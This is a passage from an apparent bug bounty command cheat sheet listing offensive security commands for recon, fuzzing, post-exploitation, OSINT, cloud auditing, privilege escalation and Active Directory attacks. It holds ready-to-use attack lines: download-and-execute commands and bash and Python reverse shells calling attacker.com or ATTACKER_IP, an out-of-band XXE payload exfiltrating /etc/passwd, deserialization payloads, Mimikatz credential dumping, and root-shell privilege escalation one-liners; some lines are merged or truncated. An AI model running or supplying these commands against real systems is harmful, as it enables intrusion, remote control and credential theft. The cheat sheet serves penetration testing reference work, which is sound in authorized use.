    :- Test for session fixation
    session_fixation_tester -u https://target.com/login --new-session-url https://target.com/afterlogin 

    
    :- Use Burp API for brute force
    burp-rest-api --config burp_config.json --intruder-payloads user_pass.txt --intruder-attack https://target.com/login 

## REPORTING & AUTOMATION (Examples)

### Report Generation examples (tools often have own reporting)    
    :- JSON output for integration
    nuclei -l urls.txt -t critical_vulns.yaml -json -o critical_report.json 
    
    :- Nikto HTML report
    nikto -h target.com -Format htm -output nikto_web_report.html
    
    :- SQLMap stores results in output dir
    sqlmap -r request.txt --batch --output-dir sqlmap_results/

### Workflow Automation (Conceptual - many custom scripts exist)    
    ./my_recon_script.sh target.com
    ./full_scan_automation.sh target.com -o /reports/target_com_$(date +%F)

## UTILITIES & MISCELLANEOUS

### Wordlist Generation    
    :- Custom wordlist from site, depth 3, min length 6
    cewl https://target.com -d 3 -m 6 -w custom_words_from_site.txt
    
    :- Include numbers found on site
    cewl https://target.com -d 2 --with-numbers -o cewl_with_numbers.txt
    
    :- Keyword processor (example, may need specific tool)
    kwp -s /usr/share/wordlists/dirb/common.txt -b 3 -e 3 > mutations.txt

### Data Processing & Manipulation    
    :- Combine and unique subdomain lists
    cat *.txt | sort -u > all_unique_subdomains.txt
    
    :- Append new unique lines
    anew old_urls.txt new_discovered_urls.txt > combined_urls.txt
    
    :- Deduplicate URLs (another tool example)
    urldedupe -s urls_with_duplicates.txt > unique_urls.txt
    
    :- Filter URLs with gf patterns for XSS
    gf xss urls_to_check.txt | tee xss_potential_urls.txt
    
    :- Filter for SQLi patterns
    gf sqli urls_to_check.txt | tee sqli_potential_urls.txt
    
    :- Extract unique parameter names from URLs
    cat urls.txt | unfurl --unique keys > unique_params.txt
    
    :- Extract scheme and path
    cat urls.txt | unfurl format %s%p > scheme_path.txt
    
    :- Probe live hosts and get info
    cat subdomains.txt | httpx -silent -status-code -title -o live_hosts_info.txt 

### Network Utilities    
    :- Scan through proxychains (replace nmap command as needed)
    proxychains4 -q nmap -sT -Pn -n target.com
    
    :- Intercept and log traffic, allow all
    mitmproxy -w traffic_log.mitm --set "block_global=false"
    
    :- Run mitmproxy with a custom Python script on port 8081
    mitmproxy -s "script.py --param value" -p 8081
    
    :- Port forwarding / pivoting
    socat TCP-LISTEN:4443,fork TCP:your_listener_ip:4444

### Miscellaneous helpful commands    
    :- Run nmap for each IP in a list
    xargs -a list_of_ips.txt -I {} nmap -sV -p80,443 {}
    
    :- Find API keys in local JS files
    find . -name "*.js" -exec grep -Hn "api_key" {} \;
    
    :- Resolve all domains in a file
    for domain in $(cat domains.txt); do host $domain; done | grep "has address" 



##
### ULTIMATE BUG BOUNTY COMMAND CHEATSHEET (Expanded Edition - Part 2)
### Organized by workflow with detailed explanations and variations##
##

## POST-EXPLOITATION (Further Actions)

### Credential Dumping & Password Recovery (more variations)    
    :- (Mimikatz and LaZagne were in the original prompt's example, here are conceptual CLI uses)
    
    :- Run Mimikatz commands (Windows)
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt 
    
    :- Recover stored passwords (Windows/Linux)
    python3 LaZagne.py all -oN lazagane_results
    
    :- Crack MD5 hashes
    hashcat -m 0 -a 0 hashes.txt rockyou.txt --force
    
    :- Crack NTLM hashes
    hashcat -m 1000 -a 0 ntlm_hashes.txt common_passwords.txt
    
    :- Crack SHA256 with John the Ripper
    john --wordlist=rockyou.txt --format=raw-sha256 hashes_sha256.txt 

### Tunneling & Pivoting    
    :- Start Chisel server for reverse SOCKS proxy
    chisel server -p 8000 --reverse
    
    :- Chisel client connecting for reverse SOCKS
    chisel client your_server_ip:8000 R:socks
    
    :- Dynamic port forwarding (SOCKS proxy) via SSH
    ssh -D 9050 user@target_server -N
    
    :- Local port forwarding
    ssh -L 8080:localhost:80 user@jump_host -N
    
    :- Remote port forwarding
    ssh -R 9090:localhost:3000 user@your_external_server -N

### Living Off The Land (LOLBAS/LOLBINS) - Conceptual examples    
    :- (These are highly dependent on the compromised system)
    
    :- Download file (Windows)
    certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe 
    
    :- PowerShell download & exec
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps_script.ps1')" 
    
    :- Bash reverse shell
    bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
    
    :- Python reverse shellpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.
    dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

## OSINT (OPEN SOURCE INTELLIGENCE)

### Domain & Email OSINT    
    :- Gather emails, subdomains, hosts
    theHarvester -d target.com -l 500 -b google,bing,linkedin -o harvester_report.html 
    
    :- Use all available sources
    theHarvester -d target.com -b all -f harvester_results_all.xml
    
    :- Hunt for social media accounts by username
    sherlock username123 --timeout 10 -o sherlock_results.txt
    
    :- Check multiple usernames, output CSV
    sherlock user1 user2 user3 --csv -o sherlock_multiuser.csv

### Google Dorking (Manual via browser, conceptual via tools if available or scripting)    
    :- Example Google Dork for confidential PDFs
    site:target.com filetype:pdf confidential
    
    :- Dork for directory listings with "backup"
    site:target.com intitle:"index of" "backup"
    
    :- Dork for SQL files with credentials
    site:target.com ext:sql "username" "password"
    
    :- Search GitHub for API keys related to target
    site:github.com "target.com" "api_key"
    
    :- Search Trello boards
    site:trello.com "target.com" "password"

### Metadata Analysis    
    :- Extract EXIF data from an image
    exiftool image.jpg -o exif_metadata.txt
    
    :- Extract common metadata from PDFs in a folder
    exiftool -r -ext pdf -common documents_folder/ -csv > metadata_report.csv 

### Code Repository Searching    
    :- (Manual on GitHub/GitLab with advanced search)
    
    :- GitHub search for 'password' in JS related to target.com
    "target.com" language:javascript password
    
    :- Search within a specific GitHub organization
    org:"TargetOrg" "SECRET_KEY"

    
    :- Scan GitHub org for sensitive files
    gitrob --github-access-token YOUR_GITHUB_TOKEN target_organization
    
    :- Scan local git repo for secrets
    gitleaks detect --source . -v -r gitleaks_report.json
    
    :- Find secrets in GitHub org
    trufflehog github --org <target_org> --json > trufflehog_github.json 
    
    :- Find secrets in local filesystem
    trufflehog filesystem /path/to/code --json > trufflehog_local.json

## CLOUD SECURITY (Beyond Initial Enum)

### AWS Security Auditing    
    :- AWS CIS Benchmarks Level 1, JSON output, silent
    prowler -g cislevel1 -M json -S -f us-east-1 -o prowler_cis_report.json 
    
    :- Check specific Prowler check (e.g., S3 public access)
    prowler -c s3_bucket_public_access -M csv -o prowler_s3_public.csv
    
    :- List checks for HIPAA group in JSON
    prowler aws -g hipaa --list-checks-json
    
    :- AWS security auditing using a specific profile
    scoutsuite aws --profile myawscli_profile --report-dir scout_aws_report/ 
    
    :- Using temporary credentials
    scoutsuite aws --access-key-id AKIA... --secret-access-key ... --session-token ... 
    
    :- Import AWS keys into Pacu
    pacu --import-keys --key-alias mycorp

    :- Example Pacu command for IAM enumeration

    :- Inside Pacu: run iam_enum_permissions
    :- Example Pacu command for S3
    :- Inside Pacu: run s3_download_bucket --bucket-name mybucket --all

### Azure Security Auditing    
    :- List Azure PIM role assignments
    az PIM role assignment list --assignee user@domain.com --all -o table 
    
    :- Azure Resource Graph query for storage accountsaz graph query -q "Resources | where type =~ 'microsoft.storage/storageaccounts' | project name, properties.primaryEndpoints.
    blob" -o json 

    :- (ScoutSuite supports Azure: scoutsuite azure --subscription-id "YOUR_SUB_ID")
    :- GCP Security Auditing### (ScoutSuite supports GCP: scoutsuite gcp --project-id "your-project-id")    
    :- Get GCP project IAM policy
    gcloud projects get-iam-policy YOUR_PROJECT_ID --format=json > gcp_iam_policy.json 
    
    :- Search IAM policies for a service accountgcloud asset search-all-iam-policies --scope=projects/YOUR_PROJECT_ID --query="policy:serviceAccount:your-sa@project.iam.
    gserviceaccount.com" 

## ADVANCED VULNERABILITY TESTING

### XXE (XML External Entity) Injection    
    :- (Manual testing with custom XML payloads is key. Tools can help automate detection)

    :- Example XXE Payload (to be used in a request body or file upload):
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>
    #
    For OOB XXE:
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:PORT/ext.dtd"> %xxe;]>
    Contents of ext.dtd on attacker server:
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:PORT/?f=%file;'>">
    %eval;
    %exfil;

### (nuclei has XXE templates)    
    :- Run XXE templates
    nuclei -u https://target.com/xml_endpoint -t vulnerabilities/xxe/ 

### Prototype Pollution    (Primarily a JavaScript vulnerability, manual testing and code review are crucial)
    Example in URL: https://target.com/?__proto__[isAdmin]=true
    Example in JSON body: {"__proto__": {"isAdmin": true}}
    Tools like ppfuzz or custom scripts can help discover potential gadgets.
    
    :- Conceptual: Fuzz for prototype pollution gadgets
    ppfuzz -u https://target.com/script.js -l 3

### HTTP Request Smuggling / Desync Attacks    
    :- (Tools like Burp's HTTP Request Smuggler extension are essential. CLI tools can help test.)
    
    :- Test for CL.TE and TE.CL vulnerabilities
    smuggler.py -u https://target.com -x
    
    :- Test POST with data, log results
    smuggler.py -u https://target.com -m POST -d "param=val" -l log.txt 
    Turbo Intruder (Burp Extension) is highly effective for this.

### Deserialization Vulnerabilities    (Highly language/framework specific. ysoserial for Java, phpggc for PHP)
    
    :- Generate Java deserialization payload
    java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/hit" > java_payload.ser 
    
    :- Generate PHP deserialization payload
    phpggc Guzzle/FW1 RCE system "curl http://attacker.com/php_hit" > php_payload.phar 
    (These payloads would then be sent in appropriate request parameters/bodies)

### Server-Side Template Injection (SSTI)    (Manual testing with language-specific payloads is common)
    Example Payloads:
    {{ 7*7 }} (Jinja2/Twig)
    <%= 7*7 %> (Ruby ERB)
    ${7*7} (Java EL, Freemarker)
    #{7*7} (Java JSF)
    @(7*7) (Razor .NET)
    
    :- Automated SSTI detection and exploitation
    tplmap -u "https://target.com/page?name=FUZZ" --os-shell
    
    :- Test POST parameter
    tplmap -u "https://target.com/search" -d "query=FUZZ" --os-cmd "whoami" 


## ADDITIONAL UTILITIES & SHELL TRICKS

### Encoding/Decoding    
    :- Base64 encode
    echo -n "string" | base64
    
    :- Base64 decode
    echo "c3RyaW5n" | base64 -d
    
    :- For Basic Auth header generation
    echo -n "admin:password" | base64 
    
    :- URL encode
    python3 -c "import urllib.parse; print(urllib.parse.quote_plus('test value?&='))" 
    
    :- URL decode
    python3 -c "import urllib.parse; print(urllib.parse.unquote_plus('test+value%3F%26%3D'))" 
    
    :- Hex encode HTML for some bypasses
    echo "<h1>test</h1>" | xxd -p | tr -d '\n'

### JSON Processing with jq    
    :- Pretty print JSON
    cat data.json | jq .
    
    :- Extract all user names
    cat data.json | jq '.users[].name'
    
    :- Filter objects with status active
    cat data.json | jq 'select(.status=="active")'
    
    :- Wrap multiple JSON objects into an array
    cat file_with_json_lines.txt | jq -s

### Interacting with Services    
    :- GET request with Auth header, pipe to jq
    curl -s -X GET "http://target.com/api/users" -H "Authorization: Bearer TOKEN" | jq . 
    
    :- Netcat listen for incoming connections
    ncat -lvnp 4444
    
    :- Send raw HTTP request from file
    ncat target.com 80 < http_request.txt

### One-liners for Recon Chains    
    :- Find live subdomains
    assetfinder --subs-only target.com | httpx -silent -threads 100 | anew live_subdomains.txt 
    
    :- Fuzz live subdomains
    cat live_subdomains.txt | nuclei -t /path/to/fuzzing-templates/ -c 50 -o fuzzing_results.txt 
    
    :- Get tech, title, status for subs
    subfinder -d target.com -silent | httpx -silent -tech-detect -title -status-code -o tech_and_status.txt 

### Masscan + Nmap    
    :- Fast port scan large range
    masscan -p80,443,8000-8100 10.0.0.0/8 --rate 100000 -oL masscan_results.txt 
    
    :- Extract IPs from masscan
    awk -F'[ /]' '/open/{print $4}' masscan_results.txt | sort -u > open_ips.txt 
    
    :- Detailed Nmap scan on IPs/ports from masscan (needs port extraction logic)
    nmap -sV -sC -iL open_ips.txt -pT:$(paste -sd, open_ports_for_nmap.txt) -oN nmap_detailed_scan.txt 


##
### ULTIMATE BUG BOUNTY COMMAND CHEATSHEET (Expanded Edition - Part 3)
### Organized by workflow with detailed explanations and variations
##

## WEB DISCOVERY & CONTENT CRAWLING (Continued Fuzzing)

### Virtual Host (VHOST) 
    :- Fuzzing (Used to find different web applications hosted on the same IP, differentiated by Host header)
    
    :- Fuzz Host header
    ffuf -w vhost_wordlist.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fs <baseline_size> -o ffuf_vhost.txt 
    
    :- Match 200, filter 404/400
    ffuf -w vhost_wordlist.txt -u https://TARGET_IP -H "Host: FUZZ.target.com" --mc 200 --fc 404,400 -o ffuf_vhost_https.txt 
    
    :- Gobuster for VHOST fuzzing
    gobuster vhost -u http://target.com -w subdomains_for_vhost.txt -t 50 -o gobuster_vhost.txt 
    
    :- Append target domain to wordlist entries
    gobuster vhost -u https://target.com -w wordlist.txt --append-domain -o gobuster_vhost_append.txt 

### HTTP Header Fuzzing     
     :- (Used to test for cache poisoning, header injection vulnerabilities, finding hidden headers)
     
     :- Fuzz X-Forwarded-Host
     -w header_payloads.txt -u https://target.com -H "X-Forwarded-Host: FUZZ" -fs <baseline_size> 
    
    :- Fuzz header names
    ffuf -w common_headers.txt:HEADER -u https://target.com -H "HEADER: testvalue" --mc 200,302 
    
    :- Fuzz HTTP methods
    ffuf -w methods.txt:METHOD -u https://target.com -X METHOD --hc 405,404 

### HTTP Parameter Pollution (HPP)    
    :- (Testing how the server handles multiple parameters with the same name)
    Manual Testing: Add duplicate parameters in GET/POST requests, e.g.:
    https://target.com/search?q=test1&q=test2
    POST / form data: param=val1&param=val2
    
    :- Use Nuclei templates for HPP
    nuclei -u https://target.com/search?q=test -t exposures/parameter-pollution.yaml 

## CONTAINER & ORCHESTRATION SECURITY (Docker/Kubernetes)

### Docker Enumeration & Exploitation (If access to Docker socket or API is gained)    
    :- Check Docker version (potential vulns)
    docker version
    
    :- List all containers (running and stopped)
    docker ps -a
    
    :- List downloaded images
    docker images
    
    :- List Docker networks
    docker network ls
    
    :- List Docker volumes
    docker volume ls
    
    :- Get detailed info about a container
    docker inspect <container_id_or_name>
    
    :- Execute a shell inside a running container
    docker exec -it <container_id_or_name> /bin/sh
    
    :- Mount host filesystem into a new container (privilege escalation if socket is exposed)
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

### Kubernetes Enumeration (requires kubectl configured or API access)    
    :- Check client and server version
    kubectl version
    
    :- Get cluster endpoint and services info
    kubectl cluster-info
    
    :- List nodes in the cluster with IPs
    kubectl get nodes -o wide
    
    :- List all namespaces
    kubectl get namespaces
    
    :- List pods in a namespace with node info
    kubectl get pods -n <namespace> -o wide
    
    :- List services in a namespace
    kubectl get services -n <namespace>
    
    :- List secrets (check permissions!)
    kubectl get secrets -n <namespace>
    
    :- List RBAC roles and bindings
    kubectl get roles,rolebindings -n <namespace>
    
    :- List configmaps (may contain config/sensitive data)
    kubectl get configmaps -n <namespace>
    
    :- Check current user's permissions in a namespace
    kubectl auth can-i --list --namespace=<namespace>
    
    :- Get detailed info about a pod (env vars, volumes)
    kubectl describe pod <pod_name> -n <namespace>
    
    :- View logs for a pod
    kubectl logs <pod_name> -n <namespace>

### Kubernetes Attack Tools    
    :- Tool for auditing K8s clusters (various checks)
    cd_k8s_audit
    
    :- Scan K8s cluster for security issues (from outside)
    kube-hunter --remote <node_ip_or_dns>
    
    :- Run kube-hunter from within a pod
    kube-hunter --pod
    kubesploit (Metasploit-like framework for K8s)

### Finding Exposed K8s API Servers (via Shodan/Censys etc.)    
    Search for: "product:kubernetes" "port:443" "ssl:kube-apiserver"
    Search for: "port:10250" "kubelet" (Kubelet read-only port)

## PRIVILEGE ESCALATION (Linux/Windows Details)

### Linux Privilege Escalation (GTFOBins usage examples)
    :- Find SUID binaries:    find / -perm -u=s -type f 2>/dev/null

### Check GTFOBins for exploitation (Assume 'find' binary has SUID)    
    https://gtfobins.github.io/gtfobins/find/
    
    :- Exploit SUID find for root shell
    find . -exec /bin/sh -p \; -quit

### Check sudo permissions:    sudo -l

### Exploit sudo permission (Assume user can run 'less' as root)    
    https://gtfobins.github.io/gtfobins/less/
    sudo less /etc/profile

    :- Execute shell via less '!' command
    
    :- (Inside less, type !/bin/sh)
    
    :- Check Cron Jobs:    
    ls -la /etc/cron*
    
    cat /etc/crontab

### Check Capabilities:    
    getcap -r / 2>/dev/null

### Exploit capabilities (Assume /usr/bin/python has cap_setuid+ep)    
    https://gtfobins.github.io/gtfobins/python/
    
    :- Use python capability to get root shell
    /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' 

### Linux PrivEsc Check Scripts (Re-iteration with common flags)    
    :- Run all checks (noisy)
    linpeas.sh -a
    
    :- Linux Smart Enumeration, level 0 (quick overview)
    lse.sh -i -l 0

### Windows Privilege Escalation (LOLBAS usage examples)    
    :- Find interesting files/permissions:
    
    :- Check permissions for Authenticated Users
    accesschk.exe -wsu "Authenticated Users" c:\*.* /accepteula
    
    :- Check ACLs for a file
    icacls C:\path\to\file

### Check AlwaysInstallElevated registry keys:    
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    (If both are 1, can create MSI for SYSTEM privileges)

### Check Unquoted Service Paths:    
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

### Exploit Unquoted Service Path (Assume service path is C:\Program Files\Some Dir\service.exe)    
    (Place malicious service.exe at C:\Program.exe or C:\Program Files\Some.exe)

### Check for stored credentials:    
    cmdkey /list
    
    :- Example leveraging saved creds
    runas /savecred /user:administrator cmd.exe

### Windows PrivEsc Check Tools (Re-iteration)    
    :- WinPEAS faster checks, cmd output
    winPEASany.exe quiet cmd fast
    
    :- PowerSploit's PowerUp module
    PowerUp.ps1 (Import-Module .\PowerUp.ps1; Invoke-AllChecks)

## WINDOWS / ACTIVE DIRECTORY RECON (Internal/Post-Exploit Context)
### (Often used after gaining initial foothold, relevant if bug bounty scope includes internal testing or pivoting)
### User & Group Enumeration    
    :- List local users
    net user
    
    :- List domain users (if joined)
    net user /domain
    
    :- List domain groups
    net group /domain
    
    :- List members of Domain Admins group
    net group "Domain Admins" /domain
    
    :- Get users and SIDs
    wmic useraccount get name,sid

### Network & Domain Info    
    :- Get network configuration, DNS servers, domain name
    ipconfig /all
    
    :- Find domain controllers
    nltest /dsgetdc:<domain_name>
    
    :- List machines in the domain
    net view /domain:<domain_name>
    
    :- Check connectivity
    ping <DomainControllerName>

    Service Principal Name (SPN) Scanning (Kerberoasting)
    
    :- Request service tickets user can delegate (Kerberoasting)
    GetUserSPNs.py (Impacket) domain.local/user -request
    
    :- Use Rubeus to perform Kerberoasting
    Rubeus.exe kerberoast /outfile:hashes.kerberoast

### SMB Enumeration    
    :- Basic SMB enumeration on a subnet
    crackmapexec smb 192.168.1.0/24
    
    :- Check credentials and list shares
    crackmapexec smb targets.txt -u username -p password --shares
    
    :- Enumerate logged-in users
    crackmapexec smb targets.txt --lusers
    
    :- Brute force RIDs to find users
    crackmapexec smb targets.txt -M rid_brute

### BloodHound Data Collection    
    :- Collect AD data using SharpHound collector
    SharpHound.exe -c All -d yourdomain.local --zipfilename data.zip 
    (Upload data.zip to BloodHound GUI for analysis)

## AUTOMATION SNIPPETS & WORKFLOW EXAMPLES

### Bash loop to run nuclei on subdomains found by subfinder    
    subfinder -d target.com -silent | nuclei -t ~/nuclei-templates/exposures/ -c 50 -o nuclei_exposure_results.txt

### Bash loop for directory brute-forcing multiple hosts    
    while read host; do ffuf -w wordlist.txt -u "$host/FUZZ" -mc 200 -o "ffuf_$(basename $host).txt"; done < live_hosts.txt

### Find JS files, then extract secrets    
    subfinder -d target.com -silent | httpx -silent | subjs -c 10 | while read url; do secretfinder -i "$url" -o "secrets_$(basename $url).json"; done

### Combine passive and active enum, resolve, check live hosts, and screenshot    
    { subfinder -d target.com -silent; amass enum -passive -d target.com -silent; } | sort -u > subs.txt
    puredns resolve subs.txt -r resolvers.txt | httpx -silent -status-code -o live.txt
    gowitness file -f live.txt -P screenshots/ --threads 10

### Filter URLs for potential XSS using gf and test with dalfox    
    cat all_urls.txt | gf xss | dalfox pipe -b your.collab.server -o dalfox_xss_results.txt

## REPORTING & DOCUMENTATION AIDS

### Markdown Notes (Keep findings organized)    
    echo "#### Vulnerability: SQL Injection" >> report.md    
    echo "**URL:** https://vuln.target.com/product?id=1" >> report.md
    echo "**Parameter:** id" >> report.md
    echo "**Payload:** \`1' OR '1'='1 -- \`" >> report.md
    echo "**Evidence:**" >> report.md
    echo '```sqlmap output...' >> report.md
    sqlmap -u "[https://vuln.target.com/product?id=1](https://vuln.target.com/product?id=1)" --batch --banner >> report.md
    echo '```' >> report.md

### Other
    :- Screenshot tools often save files automatically (gowitness, httpx -ss)
    :- Timestamping output files### nuclei ... -o "nuclei_scan_$(date +%Y%m%d_%H%M%S).txt"
    :- This cheat sheet covers a wide array of tools and techniques.### Effective bug hunting involves choosing the right tool for the job, understanding its output,### and creatively combining techniques. Always operate ethically and within the defined scope.